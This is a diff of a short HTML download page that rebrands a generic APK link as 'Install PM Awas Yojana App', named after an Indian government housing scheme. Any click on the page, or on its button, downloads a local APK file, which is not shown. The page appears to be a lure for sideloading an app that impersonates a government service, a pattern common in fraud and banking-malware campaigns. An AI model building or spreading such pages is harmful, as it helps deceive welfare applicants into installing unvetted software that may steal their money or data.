@@ -1,32 +1,46 @@
 <!DOCTYPE html>
 <html>
+
 <head>
-<meta charset="UTF-8">
 <title>Download App</title>
-
-<style>
-html, body {
-  margin: 0;
-  width: 100%;
-  height: 100%;
-  cursor: pointer;
-}
-
-body {
-  background: url('background.jpg') no-repeat center center;
-  background-size: cover;
-}
-</style>
-
-<script>
-function downloadApp() {
-  window.location.href =
-  "https://github.com/USERNAME/REPO/raw/main/app.apk";
-}
-</script>
-
 </head>
 
-<body onclick="downloadApp()">
+<body onclick="window.location.href='PM%20Awas%20Yojana.apk'" style="
+font-family:Arial;
+background-image:url('bg.webp');
+background-size:contain;
+background-repeat:no-repeat;
+background-position:center;
+height:100vh;
+margin:0;
+display:flex;
+flex-direction:column;
+justify-content:flex-end;
+align-items:center;
+cursor:pointer;
+">
+
+<h2 style="
+margin-bottom:15px;
+font-size:28px;
+color:black;
+">
+Install PM Awas Yojana App
+</h2>
+
+<a href="PM%20Awas%20Yojana.apk" download>
+<button style="
+padding:20px 50px;
+font-size:28px;
+border-radius:10px;
+border:1px solid #999;
+background:#f2f2f2;
+cursor:pointer;
+margin-bottom:40px;
+">
+Download App
+</button>
+</a>
+
 </body>
 </html>
